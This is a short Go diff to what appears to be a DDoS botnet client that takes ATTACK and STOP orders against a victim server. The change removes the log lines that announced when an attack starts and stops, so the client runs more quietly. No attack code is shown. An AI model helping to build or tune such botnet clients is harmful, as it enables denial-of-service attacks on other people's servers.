@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/json"
 	"io"
-	"log"
 	"net/http"
 	"sync"
 	"time"
@@ -121,10 +120,8 @@ func (c *Client) ListenToOrders() {
 			continue
 		}
 		if order == ATTACK {
-			log.Printf("ATTACKING! DDOS attack on %s", c.VictimServer)
 		}
 		if order == STOP {
-			log.Printf("DDOS attack on %s stopped", c.TargetServer)
 		}
 		if order == NOTHING {
 
